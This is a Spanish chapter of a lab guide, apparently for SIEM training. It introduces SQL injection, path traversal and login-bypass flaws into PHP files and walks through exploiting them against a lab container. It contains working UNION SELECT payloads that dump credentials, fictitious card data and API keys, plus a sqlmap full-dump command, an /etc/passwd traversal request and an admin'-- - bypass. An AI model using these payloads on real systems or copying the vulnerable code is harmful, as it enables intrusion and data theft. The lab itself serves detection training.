# Capítulo 2 — El "Vector de Ataque"

## 2.1 Las vulnerabilidades introducidas

| # | Archivo | Tipo | Causa raíz |
|---|---------|------|------------|
| 1 | `product.php` | **SQL Injection** | El parámetro `id` se concatena directo en la consulta. |
| 2 | `view.php`    | **LFI / Path Traversal** | `include($_GET['page'])` sin lista blanca. |
| 3 | `login.php`   | **SQLi → bypass de auth** | `username`/`password` concatenados. |

### El código vulnerable (capítulo solicitado)

`product.php` — el `id` entra **sin sanitizar** en la consulta:

```php
$id  = $_GET['id'] ?? '1';
// !!! Concatenación insegura !!!
$sql = "SELECT id, name, description, price FROM products WHERE id = $id";
$res = mysqli_query(db(), $sql);
```

Lo correcto habría sido una **sentencia preparada**:

```php
$stmt = $conn->prepare("SELECT id,name,description,price FROM products WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);   // el input nunca es código
```

Como la tabla `products` tiene **4 columnas**, un `UNION SELECT` de 4 columnas
permite volcar cualquier otra tabla de la base de datos.

### La base de datos `appdb` (objetivo de la exfiltración)

| Tabla | Contenido | Por qué importa |
|-------|-----------|-----------------|
| `products` | catálogo (4 columnas) | superficie de la inyección |
| `users` | admin / `S3cr3t_FlaG_db_2026` | credenciales del backend |
| `customers` | 7 clientes: nombre, email, **tarjeta**, DNI, dirección | **PII — joya de la corona** |
| `api_keys` | claves Stripe / AWS / SendGrid (ficticias) | secretos de aplicación |

> Todos los datos de `customers` y `api_keys` son **ficticios** (tarjetas de
> test tipo `4111…`, DNIs inventados). El objetivo del lab es demostrar una
> **exfiltración completa de base de datos**, no manejar datos reales.

---

## 2.2 FASE 1 — Reconocimiento

```bash
docker compose exec attacker bash

# Descubrir servicios y versiones
nmap -sV web

# Fingerprinting de la tecnología (Apache/PHP, cabeceras)
whatweb -a 3 http://web

# Enumerar rutas y ficheros ocultos -> genera muchos 404 (visibles en SIEM)
gobuster dir -u http://web -w /usr/share/wordlists/dirb/common.txt -x php,html
```

> En el SIEM esto se verá como una **ráfaga de 404** desde una sola IP →
> filtro `response : 404`.

---

## 2.3 FASE 2 — Explotación

### a) Confirmar la inyección (error-based)
```bash
curl "http://web/product.php?id=1'"
# -> "SQL error: ... near ''' " => el parámetro es inyectable
```

### b) Contar columnas
```bash
curl "http://web/product.php?id=1 ORDER BY 4-- -"   # OK
curl "http://web/product.php?id=1 ORDER BY 5-- -"   # error => son 4 columnas
```

### c) Enumerar tablas y exfiltrar con UNION (manual)
```bash
# Listar las tablas de la base de datos
curl "http://web/product.php?id=-1 UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -"

# Credenciales del backend (el "flag")
curl "http://web/product.php?id=-1 UNION SELECT id,username,password,role FROM users-- -"
#   -> admin / S3cr3t_FlaG_db_2026

# PII de clientes (tarjetas, emails, DNIs)
curl "http://web/product.php?id=-1 UNION SELECT full_name,email,credit_card,national_id FROM customers-- -"

# Secretos de aplicación
curl "http://web/product.php?id=-1 UNION SELECT service,api_key,NULL,NULL FROM api_keys-- -"
```

### d) Exfiltración COMPLETA automatizada con sqlmap
```bash
sqlmap -u "http://web/product.php?id=1" --batch --dbms=mysql \
       -D appdb --dump-all --exclude-sysdbs
```
sqlmap vuelca **toda la base de datos `appdb`** (users, customers, api_keys,
products) a ficheros CSV. **Su User-Agent (`sqlmap/...`) queda grabado en el
access.log** → esto es exactamente lo que detectaremos en el SIEM.

### e) LFI / Path Traversal
```bash
curl "http://web/view.php?page=../../../../etc/passwd"
# Lee el /etc/passwd del contenedor web
```

### f) Bypass de login por SQLi
```
Usuario:  admin'-- -
Clave:    (cualquiera)
```

---

## 2.4 FASE 3 — Dejar rastro (post-explotación)

El objetivo de esta fase es **generar las evidencias** que analizaremos en
Kibana. El script `attack.sh` también lanza fuerza bruta al login y peticiones
a rutas inexistentes (`admin.php`, `.git/config`, `backup.zip`...).

Cada una de estas acciones produce una o más líneas en
`/var/log/apache2/access.log`, que Filebeat empuja al SIEM en segundos.

➡️ Continúa en **`03-analisis-forense.md`**.
